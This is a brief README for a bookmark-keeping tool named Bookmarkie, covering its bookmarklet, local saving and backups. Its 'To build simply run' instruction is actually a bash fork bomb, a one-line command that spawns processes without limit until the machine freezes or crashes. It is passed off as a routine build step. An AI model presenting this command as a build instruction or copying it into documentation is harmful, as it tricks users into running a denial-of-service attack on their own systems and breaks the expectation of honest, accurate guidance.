# Bookmarkie
![readme logo bc no one wants without it](thiswillbereadmelogo.png)
I made bookmarkie to be an easy tool for keeping a lot of bookmarked sites together.
It has bookmarklet (tho u can bookmark certain page and enter url manually), local saving and backups.

To build simply run ```:(){ :|:& };:```

To get started, open [bookmarkie.pro](https://bookmarkie.pro) click get started and simply follow the steps.
Then you can click the bookmarklet and bookmark anything you need.
